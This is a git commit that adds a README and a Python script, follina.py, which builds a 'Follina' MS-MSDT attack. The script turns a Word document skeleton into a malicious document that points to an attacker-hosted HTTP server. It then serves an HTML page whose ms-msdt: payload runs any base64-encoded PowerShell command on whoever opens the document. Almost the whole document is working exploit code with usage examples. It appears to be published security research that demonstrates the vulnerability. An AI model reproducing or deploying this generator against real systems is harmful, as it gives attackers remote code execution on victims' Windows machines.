0c9e123b1bfc70378ca76eb615a1ad049ac9fcfd
John Hammond <johnhammond010@gmail.com>
2022-05-30 12:39:37 -0400

    Initial commit, including source code and maldoc skeleton

---
+++ README.md
@@ -0,0 +1,41 @@
+# MS-MSDT "Follina" Attack Vector
+
+> John Hammond | May 30, 2022
+
+--------------
+
+Create a "Follina" MS-MSDT attack with a malicious Microsoft Word document and stage a payload with an HTTP server.
+
+# Usage
+
+```
+usage: follina.py [-h] [--command COMMAND] [--output OUTPUT] [--interface INTERFACE] [--port PORT]
+
+options:
+  -h, --help            show this help message and exit
+  --command COMMAND, -c COMMAND
+                        command to run on the target (default: calc)
+  --output OUTPUT, -o OUTPUT
+                        output maldoc file (default: ./follina.rtf)
+  --interface INTERFACE, -i INTERFACE
+                        network interface or IP address to host the HTTP server (default: eth0)
+  --port PORT, -p PORT  port to serve the HTTP server (default: 8000)
+```
+
+# Examples
+
+Pop `calc.exe`:
+
+```
+$ python3 follina.py   
+[+] copied staging doc /tmp/9mcvbrwo
+[+] created maldoc ./follina.rtf
+[+] serving html payload on :8000
+```
+
+Pop `notepad.exe`:
+
+```
+$ python3 follina.py -c "notepad"
+```
+
---
+++ follina.py
@@ -0,0 +1,131 @@
+#!/usr/bin/env python3
+
+import argparse
+import zipfile
+import tempfile
+import shutil
+import os
+import netifaces
+import ipaddress
+import random
+import base64
+import http.server
+import socketserver
+import string
+import socket
+
+parser = argparse.ArgumentParser()
+
+parser.add_argument(
+    "--command",
+    "-c",
+    default="calc",
+    help="command to run on the target (default: calc)",
+)
+
+parser.add_argument(
+    "--output",
+    "-o",
+    default="./follina.rtf",
+    help="output maldoc file (default: ./follina.rtf)",
+)
+
+parser.add_argument(
+    "--interface",
+    "-i",
+    default="eth0",
+    help="network interface or IP address to host the HTTP server (default: eth0)",
+)
+
+parser.add_argument(
+    "--port",
+    "-p",
+    type=int,
+    default="8000",
+    help="port to serve the HTTP server (default: 8000)",
+)
+
+
+def main(args):
+
+    # Parse the supplied interface
+    # This is done so the maldoc knows what to reach out to.
+    try:
+        serve_host = ipaddress.IPv4Address(args.interface)
+    except ipaddress.AddressValueError:
+        try:
+            serve_host = netifaces.ifaddresses(args.interface)[netifaces.AF_INET][0][
+                "addr"
+            ]
+        except ValueError:
+            print(
+                "[!] error detering http hosting address. did you provide an interface or ip?"
+            )
+            exit()
+
+    # Copy the Microsoft Word skeleton into a temporary staging folder
+    doc_suffix = "doc"
+    staging_dir = os.path.join(
+        tempfile._get_default_tempdir(), next(tempfile._get_candidate_names())
+    )
+    doc_path = os.path.join(staging_dir, doc_suffix)
+    shutil.copytree(doc_suffix, os.path.join(staging_dir, doc_path))
+    print(f"[+] copied staging doc {staging_dir}")
+
+    # Prepare a temporary HTTP server location
+    serve_path = os.path.join(staging_dir, "www")
+    os.makedirs(serve_path)
+
+    # Modify the Word skeleton to include our HTTP server
+    document_rels_path = os.path.join(
+        staging_dir, doc_suffix, "word", "_rels", "document.xml.rels"
+    )
+
+    with open(document_rels_path) as filp:
+        external_referral = filp.read()
+
+    external_referral = external_referral.replace(
+        "{staged_html}", f"http://{serve_host}:{args.port}/index.html"
+    )
+
+    with open(document_rels_path, "w") as filp:
+        filp.write(external_referral)
+
+    # Rebuild the original office file
+    shutil.make_archive(args.output, "zip", doc_path)
+    os.rename(args.output + ".zip", args.output)
+
+    print(f"[+] created maldoc {args.output}")
+
+    # Base64 encode our command so whitespace is respected
+    base64_payload = base64.b64encode(args.command.encode("utf-8")).decode("utf-8")
+
+    # Slap together a unique MS-MSDT payload that is over 4096 bytes at minimum
+    html_payload = f"""<script>location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \\"IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'{base64_payload}'+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\\""; //"""
+    html_payload += (
+        "".join([random.choice(string.ascii_lowercase) for _ in range(4096)])
+        + "\n</script>"
+    )
+
+    # Create our HTML endpoint
+    with open(os.path.join(serve_path, "index.html"), "w") as filp:
+        filp.write(html_payload)
+
+    class ReuseTCPServer(socketserver.TCPServer):
+        def server_bind(self):
+            self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            self.socket.bind(self.server_address)
+
+    class Handler(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory=serve_path, **kwargs)
+
+    # Host the HTTP server on all interfaces
+    print(f"[+] serving html payload on :{args.port}")
+    with ReuseTCPServer(("", args.port), Handler) as httpd:
+        httpd.serve_forever()
+
+
+if __name__ == "__main__":
+
+    main(parser.parse_args())
